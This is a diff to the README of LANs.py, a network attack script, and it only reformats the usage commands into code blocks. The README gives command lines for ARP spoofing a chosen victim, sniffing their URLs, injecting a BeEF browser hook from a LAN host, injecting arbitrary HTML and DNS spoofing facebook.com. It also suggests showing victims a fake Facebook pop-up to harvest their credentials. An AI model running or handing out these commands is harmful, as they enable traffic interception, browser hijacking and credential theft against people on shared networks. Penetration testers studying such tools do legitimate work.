@@ -13,14 +13,18 @@ Tested on Kali 1.0
 
 Simplest usage:
 
-# python LANs.py
+```
+python LANs.py
+```
 
 Because there's no -ip option this will arp scan the network, compare it to a live running promiscuous capture, and tell you the clients on the network that are sending the most packets, give Windows netbios names, then you can Ctrl-C and pick your target which it will then ARP spoof. Simple ARP spoofing.
 
 
 Passive usage:
 
-# python LANs.py -u -d -p -ip 192.168.0.10
+```
+python LANs.py -u -d -p -ip 192.168.0.10
+```
 
 -u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
 
@@ -35,24 +39,30 @@ Easy to remember and will probably be the most common usage of the script: optio
 
 HTML injection:
 
-# python LANs.py -b http://192.168.0.5:3000/hook.js
+```
+python LANs.py -b http://192.168.0.5:3000/hook.js
+```
 
 Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits. Injecting HTML undetected is a dicey game, if a minor thing goes wrong then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails so during usage you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BEeF
 panel that the browser is hooked on. This is OK. If they don't get hooked on the first page just give it a few minutes. The goal is to be unintrusive. My favorite BEeF tools are in Commands > Social Engineering. Do things like create an official looking Facebook pop up saying the user's authentication expired and to re-enter their credentials.   
 
-# python LANs.py -c '<title>Owned.</title>'
+```
+python LANs.py -c '<title>Owned.</title>'
+```
 
 Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first <head> and failing that injects prior to the first </head>.
 
 
 Aggressive usage:
-# python LANs.py -v -d -p -n -na -set -dns facebook.com -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
-
+```
+python LANs.py -v -d -p -n -na -set -dns facebook.com -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
+```
 
 All options:
 
-# python LANs.py -h
-
+```
+python LANs.py -h
+```
 
 -u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
 
